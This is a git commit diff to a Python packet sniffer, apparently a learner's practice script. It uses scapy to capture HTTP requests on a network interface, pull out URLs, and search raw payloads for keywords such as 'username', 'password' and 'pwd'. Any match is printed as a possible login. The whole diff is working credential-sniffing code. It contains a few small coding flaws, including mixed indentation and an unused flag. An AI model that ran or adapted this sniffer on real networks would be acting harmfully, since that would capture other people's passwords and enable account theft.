3523f9232736c0a755cea471e695b3e5f7d55c36
root <root@localhost.localdomain>
2019-04-01 09:03:49 -0400

    update

--- practice_codes/packet_sniffer.py
+++ practice_codes/packet_sniffer.py
@@ -11,20 +11,26 @@ def get_options():
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn = process_sniffed_data)
 
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+        load = packet[scapy.Raw].load
+        keywords = ["username","user","email","login","password","pass","pwd"]
+        flag = False
+        for keyword in keywords:
+            if keyword in load:
+                    return load
+
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
 def process_sniffed_data(packet):
     if packet.haslayer(http.HTTPRequest):
-        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-        if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            keywords = ["username","user","email","login","password","pass","pwd"]
-            flag = False
-            for keyword in keywords:
-                if keyword in load:
-                    flag = True
-                    break
-            if flag:
-                print(load)
-                print(url)
+        url = get_url(packet)
+#        print("[+] HTTP Request >> " + url)
+        login_info = get_login_info(packet)
+
+	if login_info:
+            print("[+] Possible username and password >> " + login_info)
 
 options = get_options()
 
